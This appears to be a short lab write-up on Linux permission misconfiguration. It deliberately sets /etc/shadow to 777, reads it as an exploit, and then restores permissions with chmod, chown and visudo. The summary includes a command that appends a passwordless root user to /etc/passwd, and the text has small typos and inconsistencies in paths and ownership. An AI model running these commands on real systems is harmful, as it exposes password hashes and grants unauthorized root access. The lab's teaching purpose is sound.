✅ SET UP:

   1.# First create a new user called "tryhack" on the system, and it must be run with superuser privileges "sudo"
  
          # Used command : sudo useradd tryhack
   2.# After created the user change the password for the user by using the "chpasswd" command

          # used command : echo "<username>:<password>" | sudo chpasswd
   4.# We examine full detailed information about the /etc/shadow file, showing its permissions, ownership, size, and modification date to identify and exploit any 
       misconfigurations

          # used command : ls -l /etc/shadow
  5.# we modify the /etc/shadow file to be world-readable, writable, and 
      executable, which severely compromises the security 

         # used command : sudo chmod 777 /etc/shadow
      
✅ EXPLOIT:

   1.# We have accessed full permissions of the /etc/shadow file, which 
      includes critical password and account information for users

         # used command : cat /stc/shadow
      
✅ MITIGATION:

   1.# We set permissions for the /etc/shadow file, allowing only the root 
      user to modify it, members of the associated group to read it, and 
      preventing any access for other users and changes the ownership of the /etc/shadow file,
      
         # used command : sudo chmod 640 /etc/shadow
         # used command : sudo chown root:shadow etc/shadow
   2.# We edit the /etc/sudoers file, which defines who can use sudo and what they can do with it

        # used command : sudo visudo

📌 SUMMARY:

🔹 Setup:

Create multiple users (useradd alice, useradd bob).

Intentionally misconfigure sensitive file permissions (chmod 777 /etc/shadow).

🔹 Exploitation:

A low-privileged user (alice) gains unauthorized access (cat /etc/shadow).

Modify system files to escalate privileges (echo "hacker::0:0:::/bin/bash" >> /etc/passwd).

🔹 Mitigation:

Correct file permissions (chmod 640 /etc/shadow, chmod 644 /etc/passwd).

Restore proper file ownership (chown root:root /etc/shadow).

Restrict sudo access (visudo).
